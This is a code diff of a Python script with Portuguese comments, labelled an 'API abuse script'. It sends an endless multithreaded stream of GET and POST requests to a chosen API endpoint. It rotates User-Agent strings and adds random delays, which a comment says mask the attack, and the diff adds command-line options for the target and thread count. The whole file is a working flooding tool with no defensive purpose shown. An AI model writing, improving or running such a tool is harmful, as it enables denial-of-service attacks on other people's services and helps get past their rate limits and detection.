@@ -3,17 +3,20 @@ import yaml
 import concurrent.futures
 import random
 import time
+import argparse
 
-# Carregar configuração do arquivo YML
-with open("config/config_api.yml", 'r') as file:
-    config = yaml.safe_load(file)
+# Função para carregar a configuração do arquivo YML
+def load_config(file_path):
+    with open(file_path, 'r') as file:
+        return yaml.safe_load(file)
 
-# Configurações principais da API
-url = config['endpoint']
-api_methods = config.get('methods', ['GET', 'POST'])
-num_threads = config.get('threads', 50)
-headers = config.get('headers', {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'})
-data_payloads = config.get('data_payloads', [])
+# Função para criar argumentos da linha de comando
+def parse_args():
+    parser = argparse.ArgumentParser(description="Script de Abuso de API")
+    parser.add_argument('--endpoint', type=str, help='URL do endpoint da API')
+    parser.add_argument('--threads', type=int, help='Número de threads para o ataque')
+    parser.add_argument('--config', type=str, default="config/config_api.yml", help='Caminho para o arquivo de configuração YAML')
+    return parser.parse_args()
 
 # Função para variar o User-Agent
 def randomize_user_agent():
@@ -26,7 +29,7 @@ def randomize_user_agent():
     return random.choice(user_agents)
 
 # Função para enviar requisições abusivas à API
-def send_abusive_request(method, data=None):
+def send_abusive_request(method, url, headers, data=None):
     session = requests.Session()
     headers['User-Agent'] = randomize_user_agent()
     if method == 'GET':
@@ -42,25 +45,26 @@ def send_abusive_request(method, data=None):
     return response
 
 # Função para executar o abuso da API em paralelo
-def abuse_api_parallel():
+def abuse_api_parallel(api_methods, url, headers, data_payloads, num_threads):
     with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
         while True:
             for method in api_methods:
                 for data in data_payloads:
-                    executor.submit(send_abusive_request, method, data)
+                    executor.submit(send_abusive_request, method, url, headers, data)
             time.sleep(random.uniform(0.1, 0.5))  # Variação no tempo para mascarar o ataque
 
-# Dados para envio na requisição POST/PUT
-def generate_random_payload():
-    return { "key": random.randint(1000, 9999), "value": random.choice(['A', 'B', 'C', 'D']) }
+# Função principal para o abuso contínuo
+def infinite_abuse_api(config, endpoint=None, threads=None):
+    url = endpoint if endpoint else config['endpoint']
+    api_methods = config.get('methods', ['GET', 'POST'])
+    num_threads = threads if threads else config.get('threads', 50)
+    headers = config.get('headers', {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'})
+    data_payloads = config.get('data_payloads', [])
 
-# Loop principal para o abuso contínuo
-def infinite_abuse_api():
-    while True:
-        abuse_api_parallel()
+    abuse_api_parallel(api_methods, url, headers, data_payloads, num_threads)
 
-# Configurar dados dinâmicos
-data_payloads = [generate_random_payload() for _ in range(10)]
-
-# Iniciar o ataque
-infinite_abuse_api()
+# Execução principal
+if __name__ == "__main__":
+    args = parse_args()
+    config = load_config(args.config)
+    infinite_abuse_api(config, endpoint=args.endpoint, threads=args.threads)
